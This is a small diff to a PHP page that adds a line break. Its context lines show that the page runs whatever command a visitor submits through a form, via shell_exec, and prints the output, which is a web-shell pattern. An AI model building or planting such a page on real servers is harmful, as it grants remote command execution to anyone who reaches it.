@@ -18,6 +18,7 @@ $output = shell_exec($command);
     <input name="command" value="" style="width:500px;">
     <input type="submit" name="run command" value="Run">
 </form>
+<br>
 <?php echo "<pre>$output</pre>"; ?>
 
 </html>
